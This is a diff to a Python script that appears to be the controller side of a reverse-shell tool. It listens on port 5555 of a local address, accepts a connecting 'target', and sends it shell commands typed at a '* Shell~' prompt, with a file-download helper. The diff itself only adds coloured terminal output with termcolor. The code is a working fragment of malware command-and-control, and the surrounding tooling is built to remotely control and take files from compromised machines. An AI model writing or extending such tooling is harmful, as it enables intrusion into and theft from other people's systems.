@@ -1,6 +1,7 @@
 import socket
 import json
 import os
+from termcolor import colored, cprint
 
 
 def sender(data):
@@ -38,7 +39,8 @@ def download_file(file_name):
 
 def target_communication():
     while True:
-        command = input(f"* Shell~{ip}: ")
+        shell_prompt = colored(f"* Shell~{ip}: ", "magenta")
+        command = input(shell_prompt)
         sender(command)
         if command == "quit":
             break
@@ -57,8 +59,8 @@ def target_communication():
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(("192.168.0.57", 5555))
-print("[+] Listening for Incoming Connections")
+cprint("[+] Listening for Incoming Connections", "cyan")
 sock.listen(5)
 target, ip = sock.accept()
-print(f"[+] Target Connected From: {str(ip)}")
+cprint(f"[+] Target Connected From: {str(ip)}", "green")
 target_communication()
